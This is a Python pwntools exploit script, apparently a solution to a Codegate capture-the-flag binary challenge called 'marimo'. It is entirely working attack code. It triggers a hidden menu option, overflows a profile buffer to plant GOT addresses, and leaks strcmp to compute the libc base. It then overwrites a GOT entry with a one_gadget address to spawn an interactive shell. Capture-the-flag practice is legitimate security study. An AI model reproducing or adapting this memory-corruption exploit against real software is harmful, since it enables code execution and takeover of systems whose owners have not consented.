from pwn import *

#r = remote('ch41l3ng3s.codegate.kr',3333)
r = process('./marimo')

def cheet(name):
    r.recvuntil(">> ")  #category
    r.sendline("show me the marimo")
    r.recvuntil(">> ")  #name
    r.sendline(name)
    r.recvuntil(">> ")    #profile
    r.sendline("0"*32)

def modify(num, content):
    r.recvuntil(">> ")    #category
    r.sendline("V")
    r.recvuntil(">> ")    #select
    r.sendline(str(num))
    r.recvuntil(">> ")    #M / B
    r.sendline("M")
    r.recvuntil(">> ")    #new profile
    r.sendline(content)
    r.recvuntil(">> ")    #M / B
    r.sendline("B")

def View(num):
    r.recvuntil(">> ")
    r.sendline("V")
    r.recvuntil(">> ")    #select
    r.sendline(str(num))



########   memory leak   ########

printf_got = 0x603028
strcmp_got = 0x603040
#malloc_got = 0x603050

cheet("A"*16)
cheet("B"*16)

payload1 = ""
payload1 += "\x00"*0x38
payload1 += p64(strcmp_got)
payload1 += p64(printf_got)
#payload1 += p64(21)

raw_input("### Start! ###")
sleep(3)
modify(0, payload1)

raw_input("### memory leak! ###")
View(1)
r.recvuntil("name : ")
leak = r.recv(6)
strcmp_addr = u64(leak[0:6].ljust(8,'\x00'))
libc = strcmp_addr - 652656
one_gadget = libc + 0x45216
#malloc_hook = libc + 3951376

success("strcmp address = " + hex(strcmp_addr))
success("libc base = " + hex(libc))



########  overwrite got  #########

# __malloc_hook = printf_addr + 3597312
# malloc_addr = libc + 4079360

raw_input("### got overwrite! ###")
r.recvuntil(">> ")
r.sendline("M")
r.recvuntil(">> ")    #new profile
r.sendline(p64(one_gadget))
r.interactive()


